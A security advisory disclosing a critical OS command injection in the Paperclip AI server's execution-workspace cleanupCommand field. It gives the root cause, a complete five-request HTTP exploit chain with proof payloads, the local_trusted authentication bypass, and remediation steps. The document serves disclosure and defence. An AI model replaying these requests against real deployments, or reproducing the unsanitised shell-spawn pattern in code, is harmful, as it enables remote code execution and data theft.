# [C] Paperclip: OS Command Injection via Execution Workspace cleanupCommand

## Summary
Severity: Critical
Advisory: GHSA-vr7g-88fq-vhq3
CWE: CWE-78
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-vr7g-88fq-vhq3
Type: github-advisory

## Affected
- npm: `@paperclipai/server` — affected >=0 <2026.416.0

## Details
| Field | Value |
|-------|-------|
| **Affected Software** | Paperclip AI v2026.403.0 |
| **Affected Component** | Execution Workspace lifecycle (`workspace-runtime.ts`) |
| **Affected Endpoint** | `PATCH /api/execution-workspaces/:id` |
| **Deployment Modes** | All — `local_trusted` (zero auth), `authenticated` (any company user) |
| **Platforms** | Linux, macOS, Windows (with Git installed) |
| **Date** | 2026-04-13 |

---

## Executive Summary

A critical OS command injection vulnerability exists in Paperclip's execution workspace lifecycle. An attacker can inject arbitrary shell commands into the `cleanupCommand` field via the `PATCH /api/execution-workspaces/:id` endpoint. When the workspace is archived, the server executes this command verbatim via `child_process.spawn(shell, ["-c", cleanupCommand])` with no input validation or sanitization. In `local_trusted` mode (the default for desktop installations), this requires zero authentication.

Three independent proofs of exploitation were demonstrated on Windows 11: arbitrary file write, full system information exfiltration (`systeminfo`), and GUI application launch (`calc.exe`).

---

## Root Cause Analysis

### Vulnerable Code Path

**`server/src/services/workspace-runtime.ts` (line ~738)**

The `cleanupExecutionWorkspaceArtifacts()` function iterates over cleanup commands from workspace config and executes each via shell:

```typescript
// workspace-runtime.ts — cleanupExecutionWorkspaceArtifacts()
for (const command of cleanupCommands) {
  await recordWorkspaceCommandOperation(ws, command, ...);
}

// recordWorkspaceCommandOperation() →
const shell = resolveShell();  // process.env.SHELL || "sh"
spawn(shell, ["-c", command]);
```

### Missing Input Validation

**`server/src/routes/execution-workspaces.ts` — PATCH handler**

The PATCH endpoint accepts a `config` object containing `cleanupCommand` with no validation:

```
PATCH /api/execution-workspaces/:id
Body: { "config": { "cleanupCommand": "<ARBITRARY_COMMAND>" } }
```

The `cleanupCommand` value is stored directly in workspace metadata and later passed to `spawn()` without sanitization, allowlisting, or escaping.

### Shell Resolution

**`resolveShell()`** returns `process.env.SHELL` or falls back to `"sh"`:

- **Linux/macOS**: `/bin/sh` exists natively — commands execute immediately
- **Windows**: `sh.exe` is available via Git for Windows (`C:\Program Files\Git\bin\sh.exe`) — Paperclip requires Git, so `sh` is present on most installations

---

## Attack Chain

The exploit requires 5 HTTP requests with zero authentication in `local_trusted` mode:

### Step 1 — Find a Company

```http
GET /api/companies HTTP/1.1
Host: 127.0.0.1:3100
```

```json
[{"id": "59e9248b-...", "name": "Hello", ...}]
```

### Step 2 — Find an Execution Workspace

```http
GET /api/companies/59e9248b-.../execution-workspaces HTTP/1.1
Host: 127.0.0.1:3100
```

```json
[{"id": "da078b2d-...", "name": "HEL-1", "status": "active", ...}]
```

### Step 3 — Reactivate Workspace (if archived/failed)

```http
PATCH /api/execution-workspaces/da078b2d-... HTTP/1.1
Host: 127.0.0.1:3100
Content-Type: application/json

{"status": "active"}
```

### Step 4 — Inject cleanupCommand (Command Injection)

```http
PATCH /api/execution-workspaces/da078b2d-... HTTP/1.1
Host: 127.0.0.1:3100
Content-Type: application/json

{"config": {"cleanupCommand": "echo RCE_PROOF > \"/tmp/rce-proof.txt\""}}
```

Response confirms storage:
```json
{"id": "da078b2d-...", "config": {"cleanupCommand": "echo RCE_PROOF > \"/tmp/rce-proof.txt\""}, ...}
```

### Step 5 — Trigger RCE (Archive Workspace)

```http
PATCH /api/execution-workspaces/da078b2d-... HTTP/1.1
Host: 127.0.0.1:3100
Content-Type: application/json

{"status": "archived"}
```

This triggers `cleanupExecutionWorkspaceArtifacts()` which calls:
```
spawn(shell, ["-c", "echo RCE_PROOF > \"/tmp/rce-proof.txt\""])
```

The injected command is executed with the privileges of the Paperclip server process.

---

## Authentication Bypass by Deployment Mode

### `local_trusted` Mode (Default Desktop Install)

Every HTTP request is auto-granted full admin privileges with zero authentication:

```typescript
// middleware/auth.ts
req.actor = {
  type: "board",
  userId: "local-board",
  isInstanceAdmin: true,
  source: "local_implicit"
};
```

The `boardMutationGuard` middleware is also bypassed:

```typescript
// middleware/board-mutation-guard.ts (line 55)
if (req.actor.source === "local_implicit" || req.actor.source === "board_key") {
  next();
  return;
}
```

### `authenticated` Mode

Any user with company access can exploit this vulnerability. The `assertCompanyAccess` check occurs AFTER the database query (BOLA/IDOR pattern), and no additional authorization is required to modify workspace config fields.

---

## Proof of Concept — 3 Independent RCE Proofs (Windows 11)

All proofs executed via the automated PoC script `poc_paperclip_rce.py`.

### Proof 1: Arbitrary File Write

**Payload:** `echo RCE_PROOF_595c04f7 > "%TEMP%\rce-proof-595c04f7.txt"`

**Result:**
```
  +================================================+
  |  VULNERABLE - Arbitrary Code Execution!         |
  |  cleanupCommand was executed on the server      |
  +================================================+

  Proof file: %TEMP%\rce-proof-595c04f7.txt
  Content:    RCE_PROOF_595c04f7
  Platform:   Windows 11
```

### Proof 2: System Command Execution (Data Exfiltration)

**Payload:** `systeminfo > "%TEMP%\rce-sysinfo-595c04f7.txt"`

**Result:**
```
  +================================================+
  |  System command output captured!                |
  +================================================+

  Host Name:                     [REDACTED]
  OS Name:                       Microsoft Windows 11 Home
  OS Version:                    10.0.26200 N/A Build 26200
  OS Manufacturer:               Microsoft Corporation
  Registered Owner:              [REDACTED]
  Product ID:                    [REDACTED]
  System Manufacturer:           [REDACTED]
  System Model:                  [REDACTED]
  System Type:                   x64-based PC
  ... (72 total lines of system information)
```

### Proof 3: GUI Application Launch (calc.exe)

**Payload:** `calc.exe`

**Result:**
```
  +================================================+
  |  calc.exe launched! Check your taskbar.         |
  |  This is server-side code execution.            |
  +================================================+
```

Windows Calculator was launched on the host system by the Paperclip server process.

---

## Impact Assessment

| Impact | Description |
|--------|-------------|
| **Remote Code Execution** | Arbitrary commands execute as the Paperclip server process |
| **Data Exfiltration** | Full system info, environment variables, files readable by server process |
| **Lateral Movement** | Attacker can install tools, pivot to internal network |
| **Supply Chain** | Workspaces contain source code — attacker can inject backdoors into repositories |
| **Persistence** | Attacker can create scheduled tasks, install reverse shells |
| **Privilege Escalation** | Server may run with elevated privileges; attacker inherits them |

### Attack Scenarios

1. **Desktop user (local_trusted)**: Any process or malicious web page making local HTTP requests to `127.0.0.1:3100` can achieve RCE with zero authentication
2. **Team deployment (authenticated)**: Any employee with Paperclip access can compromise the server and all repositories managed by it
3. **Chained attack**: Combine with SSRF or DNS rebinding to attack Paperclip instances from the network


---

## Remediation Recommendations

### Immediate (Critical)

1. **Input validation**: Reject or sanitize `cleanupCommand` and `teardownCommand` fields in the PATCH handler. Do not allow user-supplied values to be passed to shell execution.

2. **Command allowlisting**: If custom cleanup commands are needed, implement a strict allowlist of permitted commands (e.g., `git clean`, `rm -rf <workspace_dir>`).

3. **Use `execFile` instead of `spawn` with shell**: Replace `spawn(shell, ["-c", command])` with `execFile()` using an argument array, which prevents shell metacharacter injection.

### Short-term

4. **Authorization check**: Add proper authorization checks BEFORE processing the PATCH request. Validate that the user has explicit permission to modify workspace configuration.

5. **Separate config fields**: Do not allow the same endpoint to update both workspace status and security-sensitive configuration fields like commands.

### Long-term

6. **Sandboxed execution**: Run cleanup commands in a sandboxed environment (container, VM) with minimal privileges.

7. **Audit logging**: Log all modifications to command fields for forensic analysis.

8. **Security review**: Audit all `spawn`, `exec`, and `execFile` calls across the codebase for similar injection patterns.

---

## Proof of Concept Script
## Script
[poc_paperclip_rce.py](https://github.com/user-attachments/files/26697937/poc_paperclip_rce.py)

The full automated PoC is available as `poc_paperclip_rce.py`. It:

- Auto-detects deployment mode and skips auth for `local_trusted`
- Discovers company and workspace automatically
- Reactivates failed/archived workspaces
- On Windows, auto-locates `sh.exe` from Git and restarts Paperclip if needed
- Runs 3 independent RCE proofs: file write, systeminfo, calc.exe
- Works on Linux, macOS, and Windows

**Usage:**
```bash
python poc_paperclip_rce.py --target http://127.0.0.1:3100
```

## References
- https://github.com/paperclipai/paperclip/security/advisories/GHSA-vr7g-88fq-vhq3
- https://github.com/paperclipai/paperclip
